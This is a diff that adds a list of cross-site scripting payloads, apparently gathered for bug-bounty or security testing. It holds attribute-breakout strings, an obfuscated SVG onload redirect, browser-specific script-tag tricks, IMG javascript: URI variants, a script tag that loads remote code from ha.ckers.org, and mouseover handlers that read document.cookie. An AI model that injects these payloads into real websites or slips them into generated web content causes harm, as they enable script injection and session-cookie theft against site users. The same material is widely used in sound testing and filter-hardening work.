@@ -1,0 +1,30 @@
+" onfocus="alert(1)" name="bounty
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+
+# Internet Explorer, Edge
+<svg><script>alert(1)<p>
+
+# Firefox
+
+<svg><x><script>alert(1)x>
+
+# Common
+
+'';!--"<XSS>=&{()}
+
+<SCRIPT SRC=http://ha.ckers.org/xss.js>SCRIPT>
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC=javascript:alert('XSS')>
+
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+
+<IMG SRC=javascript:alert("XSS")>
+
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+
+<a onmouseover="alert(document.cookie)">xxs linka>
+
+<a onmouseover=alert(document.cookie)>xxs linka>
+
